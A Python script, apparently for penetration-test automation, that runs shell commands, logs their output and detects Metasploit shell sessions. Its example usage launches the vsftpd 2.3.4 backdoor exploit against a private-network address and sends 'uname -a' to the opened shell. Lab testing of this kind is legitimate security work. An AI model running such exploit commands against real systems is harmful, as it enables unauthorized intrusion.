import subprocess
from datetime import datetime
import time
import re

def execute_command(command, timeout=30, user_input=None):
    """
    Execute a shell command for testing, print its output, return the output filename, detect specific output,
    automatically handle user input, and terminate if running too long.

    Args:
    - command: the shell command to execute.
    - timeout: maximum duration in seconds to allow command to run.
    - user_input: Optional input to be provided to the command. This should be a string including necessary line breaks.
    """
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"test_results_{timestamp}.txt"
    shell_detected = False  # Flag to indicate if a shell was detected in the output

    try:
        start_time = time.time()  # Record start time
        with open(filename, 'w', encoding='utf-8') as f:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, universal_newlines=True)
            
            # Check and send user input if provided
            if user_input:
                process.stdin.write(user_input)  # Directly pass string without encoding
                process.stdin.flush()
            
            while True:
                current_time = time.time()
                elapsed_time = current_time - start_time
                
                # Check if process is still running and terminate if timeout is exceeded
                if process.poll() is None and elapsed_time > timeout:
                    process.terminate()
                    print(f"Command terminated due to timeout: {command}")
                    break
                
                line = process.stdout.readline()
                if not line:
                    if process.poll() is not None:
                        break  # Exit loop if process has finished
                    time.sleep(0.1)  # Briefly wait for more output
                    continue
                
                print(line, end='')  # Print each line of the output
                f.write(line)  # Write the output to a file

                # Check for specific patterns in the output
                if re.search(r'(Success, shell opened)|(Command shell session \d+ opened)', line):                    
                    shell_detected = True
                    print("Shell detected in command output.")

        # Ensure the process is terminated after detecting the shell or if an error occurs
        if shell_detected or process.poll() is None:
            process.terminate()
            print("Terminating command after detection or due to an error.")

        # Check for errors in the execution, if the process exits with a non-zero status
        if process.wait() != 0:
            print(f"Command finished with error: {command}")
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")
    except Exception as e:
        print(f"Unexpected error: {e}")

    return filename, shell_detected

# Example usage
if __name__ == "__main__":
    test_command = 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.18.129; set RPORT 21; exploit"'
    user_input = 'uname -a\n'  # Simulate pressing Enter, or provide the necessary input followed by '\n' for Enter.
    _, shell_detected = execute_command(test_command, user_input=user_input)
    if shell_detected:
        print("Detected shell in test command output.")
